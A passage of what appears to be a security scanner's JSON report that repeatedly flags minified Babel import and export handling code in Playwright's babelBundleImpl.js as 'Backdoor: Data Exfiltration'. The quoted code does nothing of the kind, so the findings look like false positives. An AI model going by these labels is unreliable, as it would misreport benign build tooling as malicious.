          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 7174,
                  "endLine": 1639,
                  "endColumn": 7179,
                  "snippet": {
                    "text": "(let[u,c]of a)c.wrap=t(u,c,i.get(u));return{hasExports:l,local:s,sources:a}}function ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(l),n.set(l.get(\"local\").node.name,\"block\")});return}}if(a.isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";",
                    "rendered": {
                      "text": "(let[u,c]of a)c.wrap=t(u,c,i.get(u));return{hasExports:l,local:s,sources:a}}function ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(l),n.set(l.get(\"local\").node.name,\"block\")});return}}if(a.isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";",
                      "markdown": "`(let[u,c]of a)c.wrap=t(u,c,i.get(u));return{hasExports:l,local:s,sources:a}}function ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(l),n.set(l.get(\"local\").node.name,\"block\")});return}}if(a.isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDeclaration())o=\"block\";else if(a.isVariableDeclaration({kind:\"var\"}))o=\"var\";`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 7098,
                  "endLine": 1639,
                  "endColumn": 7103,
                  "snippet": {
                    "text": "ault\"?c=!0:f=!0;c&&f?u.interop=\"namespace\":c&&(u.interop=\"default\")}if(t)for(let[u,c]of a)c.wrap=t(u,c,i.get(u));return{hasExports:l,local:s,sources:a}}function ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(l),n.set(l.get(\"local\").node.name,\"block\")});return}}if(a.isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDe",
                    "rendered": {
                      "text": "ault\"?c=!0:f=!0;c&&f?u.interop=\"namespace\":c&&(u.interop=\"default\")}if(t)for(let[u,c]of a)c.wrap=t(u,c,i.get(u));return{hasExports:l,local:s,sources:a}}function ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(l),n.set(l.get(\"local\").node.name,\"block\")});return}}if(a.isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDe",
                      "markdown": "`ault\"?c=!0:f=!0;c&&f?u.interop=\"namespace\":c&&(u.interop=\"default\")}if(t)for(let[u,c]of a)c.wrap=t(u,c,i.get(u));return{hasExports:l,local:s,sources:a}}function ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(l),n.set(l.get(\"local\").node.name,\"block\")});return}}if(a.isFunctionDeclaration())o=\"hoisted\";else if(a.isClassDe`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 6985,
                  "endLine": 1639,
                  "endColumn": 6990,
                  "snippet": {
                    "text": "ortAll&&(f=!0);for(let p of u.imports.values())p===\"default\"?c=!0:f=!0;for(let p of u.reexports.values())p===\"default\"?c=!0:f=!0;c&&f?u.interop=\"namespace\":c&&(u.interop=\"default\")}if(t)for(let[u,c]of a)c.wrap=t(u,c,i.get(u));return{hasExports:l,local:s,sources:a}}function ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(",
                    "rendered": {
                      "text": "ortAll&&(f=!0);for(let p of u.imports.values())p===\"default\"?c=!0:f=!0;for(let p of u.reexports.values())p===\"default\"?c=!0:f=!0;c&&f?u.interop=\"namespace\":c&&(u.interop=\"default\")}if(t)for(let[u,c]of a)c.wrap=t(u,c,i.get(u));return{hasExports:l,local:s,sources:a}}function ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(",
                      "markdown": "`ortAll&&(f=!0);for(let p of u.imports.values())p===\"default\"?c=!0:f=!0;for(let p of u.reexports.values())p===\"default\"?c=!0:f=!0;c&&f?u.interop=\"namespace\":c&&(u.interop=\"default\")}if(t)for(let[u,c]of a)c.wrap=t(u,c,i.get(u));return{hasExports:l,local:s,sources:a}}function ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.node.source&&a.get(\"source\").isStringLiteral()){a.get(\"specifiers\").forEach(l=>{HC(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 6902,
                  "endLine": 1639,
                  "endColumn": 6907,
                  "snippet": {
                    "text": "r(let u of a.values()){let c=!1,f=!1;u.importsNamespace.size>0&&(c=!0,f=!0),u.reexportAll&&(f=!0);for(let p of u.imports.values())p===\"default\"?c=!0:f=!0;for(let p of u.reexports.values())p===\"default\"?c=!0:f=!0;c&&f?u.interop=\"namespace\":c&&(u.interop=\"default\")}if(t)for(let[u,c]of a)c.wrap=t(u,c,i.get(u));return{hasExports:l,local:s,sources:a}}function ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.",
                    "rendered": {
                      "text": "r(let u of a.values()){let c=!1,f=!1;u.importsNamespace.size>0&&(c=!0,f=!0),u.reexportAll&&(f=!0);for(let p of u.imports.values())p===\"default\"?c=!0:f=!0;for(let p of u.reexports.values())p===\"default\"?c=!0:f=!0;c&&f?u.interop=\"namespace\":c&&(u.interop=\"default\")}if(t)for(let[u,c]of a)c.wrap=t(u,c,i.get(u));return{hasExports:l,local:s,sources:a}}function ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.",
                      "markdown": "`r(let u of a.values()){let c=!1,f=!1;u.importsNamespace.size>0&&(c=!0,f=!0),u.reexportAll&&(f=!0);for(let p of u.imports.values())p===\"default\"?c=!0:f=!0;for(let p of u.reexports.values())p===\"default\"?c=!0:f=!0;c&&f?u.interop=\"namespace\":c&&(u.interop=\"default\")}if(t)for(let[u,c]of a)c.wrap=t(u,c,i.get(u));return{hasExports:l,local:s,sources:a}}function ape(e,t,r){let n=new Map;e.get(\"body\").forEach(a=>{let o;if(a.isImportDeclaration())o=\"import\";else{if(a.isExportDefaultDeclaration()&&(a=a.get(\"declaration\")),a.isExportNamedDeclaration()){if(a.node.declaration)a=a.get(\"declaration\");else if(t&&a.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 6452,
                  "endLine": 1639,
                  "endColumn": 6457,
                  "snippet": {
                    "text": "oc:u.node.loc},c.referenced=!0}else if(u.isExportNamedDeclaration()&&u.node.source){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{HC(f);let p=Ec(f.get(\"local\"),n),m=Ec(f.get(\"exported\"),n);if(c.reexports.set(m,p),c.referenced=!0,m===\"__esModule\")throw f.get(\"exported\").buildCodeFrameError('Illegal export \"__esModule\".')})}else(u.isExportNamedDeclaration()||u.isExportDefaultDeclaration())&&(l=!0)});for(let u of a.values()){let c=!1,f=!1;u.importsNamespace.size>0&&(c=!0,f=!0),u.reexportAll&&(f=!0);for(let p of u.imports.values())p===\"default\"?c=!0:f=!0;f",
                    "rendered": {
                      "text": "oc:u.node.loc},c.referenced=!0}else if(u.isExportNamedDeclaration()&&u.node.source){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{HC(f);let p=Ec(f.get(\"local\"),n),m=Ec(f.get(\"exported\"),n);if(c.reexports.set(m,p),c.referenced=!0,m===\"__esModule\")throw f.get(\"exported\").buildCodeFrameError('Illegal export \"__esModule\".')})}else(u.isExportNamedDeclaration()||u.isExportDefaultDeclaration())&&(l=!0)});for(let u of a.values()){let c=!1,f=!1;u.importsNamespace.size>0&&(c=!0,f=!0),u.reexportAll&&(f=!0);for(let p of u.imports.values())p===\"default\"?c=!0:f=!0;f",
                      "markdown": "`oc:u.node.loc},c.referenced=!0}else if(u.isExportNamedDeclaration()&&u.node.source){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{HC(f);let p=Ec(f.get(\"local\"),n),m=Ec(f.get(\"exported\"),n);if(c.reexports.set(m,p),c.referenced=!0,m===\"__esModule\")throw f.get(\"exported\").buildCodeFrameError('Illegal export \"__esModule\".')})}else(u.isExportNamedDeclaration()||u.isExportDefaultDeclaration())&&(l=!0)});for(let u of a.values()){let c=!1,f=!1;u.importsNamespace.size>0&&(c=!0,f=!0),u.reexportAll&&(f=!0);for(let p of u.imports.values())p===\"default\"?c=!0:f=!0;f`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 6368,
                  "endLine": 1639,
                  "endColumn": 6373,
                  "snippet": {
                    "text": "ion()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}else if(u.isExportNamedDeclaration()&&u.node.source){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{HC(f);let p=Ec(f.get(\"local\"),n),m=Ec(f.get(\"exported\"),n);if(c.reexports.set(m,p),c.referenced=!0,m===\"__esModule\")throw f.get(\"exported\").buildCodeFrameError('Illegal export \"__esModule\".')})}else(u.isExportNamedDeclaration()||u.isExportDefaultDeclaration())&&(l=!0)});for(let u of a.values()){let c=!1,f=!1;u.importsNamespace.size>0&&(c=!0,f",
                    "rendered": {
                      "text": "ion()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}else if(u.isExportNamedDeclaration()&&u.node.source){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{HC(f);let p=Ec(f.get(\"local\"),n),m=Ec(f.get(\"exported\"),n);if(c.reexports.set(m,p),c.referenced=!0,m===\"__esModule\")throw f.get(\"exported\").buildCodeFrameError('Illegal export \"__esModule\".')})}else(u.isExportNamedDeclaration()||u.isExportDefaultDeclaration())&&(l=!0)});for(let u of a.values()){let c=!1,f=!1;u.importsNamespace.size>0&&(c=!0,f",
                      "markdown": "`ion()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}else if(u.isExportNamedDeclaration()&&u.node.source){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{HC(f);let p=Ec(f.get(\"local\"),n),m=Ec(f.get(\"exported\"),n);if(c.reexports.set(m,p),c.referenced=!0,m===\"__esModule\")throw f.get(\"exported\").buildCodeFrameError('Illegal export \"__esModule\".')})}else(u.isExportNamedDeclaration()||u.isExportDefaultDeclaration())&&(l=!0)});for(let u of a.values()){let c=!1,f=!1;u.importsNamespace.size>0&&(c=!0,f`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 6345,
                  "endLine": 1639,
                  "endColumn": 6350,
                  "snippet": {
                    "text": "f(u.isExportAllDeclaration()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}else if(u.isExportNamedDeclaration()&&u.node.source){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{HC(f);let p=Ec(f.get(\"local\"),n),m=Ec(f.get(\"exported\"),n);if(c.reexports.set(m,p),c.referenced=!0,m===\"__esModule\")throw f.get(\"exported\").buildCodeFrameError('Illegal export \"__esModule\".')})}else(u.isExportNamedDeclaration()||u.isExportDefaultDeclaration())&&(l=!0)});for(let u of a.values()){let c=!1,f=!1;u.importsNa",
                    "rendered": {
                      "text": "f(u.isExportAllDeclaration()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}else if(u.isExportNamedDeclaration()&&u.node.source){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{HC(f);let p=Ec(f.get(\"local\"),n),m=Ec(f.get(\"exported\"),n);if(c.reexports.set(m,p),c.referenced=!0,m===\"__esModule\")throw f.get(\"exported\").buildCodeFrameError('Illegal export \"__esModule\".')})}else(u.isExportNamedDeclaration()||u.isExportDefaultDeclaration())&&(l=!0)});for(let u of a.values()){let c=!1,f=!1;u.importsNa",
                      "markdown": "`f(u.isExportAllDeclaration()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}else if(u.isExportNamedDeclaration()&&u.node.source){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{HC(f);let p=Ec(f.get(\"local\"),n),m=Ec(f.get(\"exported\"),n);if(c.reexports.set(m,p),c.referenced=!0,m===\"__esModule\")throw f.get(\"exported\").buildCodeFrameError('Illegal export \"__esModule\".')})}else(u.isExportNamedDeclaration()||u.isExportDefaultDeclaration())&&(l=!0)});for(let u of a.values()){let c=!1,f=!1;u.importsNa`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 6298,
                  "endLine": 1639,
                  "endColumn": 6303,
                  "snippet": {
                    "text": "reexports.set(d,p)}),c.referenced=!0)}})}else if(u.isExportAllDeclaration()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}else if(u.isExportNamedDeclaration()&&u.node.source){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{HC(f);let p=Ec(f.get(\"local\"),n),m=Ec(f.get(\"exported\"),n);if(c.reexports.set(m,p),c.referenced=!0,m===\"__esModule\")throw f.get(\"exported\").buildCodeFrameError('Illegal export \"__esModule\".')})}else(u.isExportNamedDeclaration()||u.isExportDefaultDeclaration())&&(l=!0)});for",
                    "rendered": {
                      "text": "reexports.set(d,p)}),c.referenced=!0)}})}else if(u.isExportAllDeclaration()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}else if(u.isExportNamedDeclaration()&&u.node.source){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{HC(f);let p=Ec(f.get(\"local\"),n),m=Ec(f.get(\"exported\"),n);if(c.reexports.set(m,p),c.referenced=!0,m===\"__esModule\")throw f.get(\"exported\").buildCodeFrameError('Illegal export \"__esModule\".')})}else(u.isExportNamedDeclaration()||u.isExportDefaultDeclaration())&&(l=!0)});for",
                      "markdown": "`reexports.set(d,p)}),c.referenced=!0)}})}else if(u.isExportAllDeclaration()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}else if(u.isExportNamedDeclaration()&&u.node.source){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{HC(f);let p=Ec(f.get(\"local\"),n),m=Ec(f.get(\"exported\"),n);if(c.reexports.set(m,p),c.referenced=!0,m===\"__esModule\")throw f.get(\"exported\").buildCodeFrameError('Illegal export \"__esModule\".')})}else(u.isExportNamedDeclaration()||u.isExportDefaultDeclaration())&&(l=!0)});for`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 5952,
                  "endLine": 1639,
                  "endColumn": 5957,
                  "snippet": {
                    "text": "f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportSpecifier()){let p=Ec(f.get(\"imported\"),n),m=f.get(\"local\").node.name;c.imports.set(m,p);let b=s.get(m);b&&(s.delete(m),b.names.forEach(d=>{c.reexports.set(d,p)}),c.referenced=!0)}})}else if(u.isExportAllDeclaration()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}else if(u.isExportNamedDeclaration()&&u.node.source){l=!0;let c=o(u.node.s",
                    "rendered": {
                      "text": "f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportSpecifier()){let p=Ec(f.get(\"imported\"),n),m=f.get(\"local\").node.name;c.imports.set(m,p);let b=s.get(m);b&&(s.delete(m),b.names.forEach(d=>{c.reexports.set(d,p)}),c.referenced=!0)}})}else if(u.isExportAllDeclaration()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}else if(u.isExportNamedDeclaration()&&u.node.source){l=!0;let c=o(u.node.s",
                      "markdown": "`f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportSpecifier()){let p=Ec(f.get(\"imported\"),n),m=f.get(\"local\").node.name;c.imports.set(m,p);let b=s.get(m);b&&(s.delete(m),b.names.forEach(d=>{c.reexports.set(d,p)}),c.referenced=!0)}})}else if(u.isExportAllDeclaration()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}else if(u.isExportNamedDeclaration()&&u.node.source){l=!0;let c=o(u.node.s`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 5902,
                  "endLine": 1639,
                  "endColumn": 5907,
                  "snippet": {
                    "text": "ports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportSpecifier()){let p=Ec(f.get(\"imported\"),n),m=f.get(\"local\").node.name;c.imports.set(m,p);let b=s.get(m);b&&(s.delete(m),b.names.forEach(d=>{c.reexports.set(d,p)}),c.referenced=!0)}})}else if(u.isExportAllDeclaration()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}else if(u.isExportNamedD",
                    "rendered": {
                      "text": "ports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportSpecifier()){let p=Ec(f.get(\"imported\"),n),m=f.get(\"local\").node.name;c.imports.set(m,p);let b=s.get(m);b&&(s.delete(m),b.names.forEach(d=>{c.reexports.set(d,p)}),c.referenced=!0)}})}else if(u.isExportAllDeclaration()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}else if(u.isExportNamedD",
                      "markdown": "`ports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportSpecifier()){let p=Ec(f.get(\"imported\"),n),m=f.get(\"local\").node.name;c.imports.set(m,p);let b=s.get(m);b&&(s.delete(m),b.names.forEach(d=>{c.reexports.set(d,p)}),c.referenced=!0)}})}else if(u.isExportAllDeclaration()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}else if(u.isExportNamedD`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 5879,
                  "endLine": 1639,
                  "endColumn": 5884,
                  "snippet": {
                    "text": "ames.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportSpecifier()){let p=Ec(f.get(\"imported\"),n),m=f.get(\"local\").node.name;c.imports.set(m,p);let b=s.get(m);b&&(s.delete(m),b.names.forEach(d=>{c.reexports.set(d,p)}),c.referenced=!0)}})}else if(u.isExportAllDeclaration()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}e",
                    "rendered": {
                      "text": "ames.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportSpecifier()){let p=Ec(f.get(\"imported\"),n),m=f.get(\"local\").node.name;c.imports.set(m,p);let b=s.get(m);b&&(s.delete(m),b.names.forEach(d=>{c.reexports.set(d,p)}),c.referenced=!0)}})}else if(u.isExportAllDeclaration()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}e",
                      "markdown": "`ames.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportSpecifier()){let p=Ec(f.get(\"imported\"),n),m=f.get(\"local\").node.name;c.imports.set(m,p);let b=s.get(m);b&&(s.delete(m),b.names.forEach(d=>{c.reexports.set(d,p)}),c.referenced=!0)}})}else if(u.isExportAllDeclaration()){l=!0;let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),c.reexportAll={loc:u.node.loc},c.referenced=!0}e`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
